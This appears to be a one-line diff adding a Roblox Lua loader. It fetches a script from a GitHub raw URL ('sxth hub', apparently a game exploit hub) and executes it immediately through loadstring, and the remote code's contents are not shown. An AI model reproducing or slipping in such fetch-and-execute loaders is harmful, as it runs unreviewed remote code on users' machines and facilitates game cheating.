@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/toocoldhub/sxth-hub/main/sxth%20hub"))()
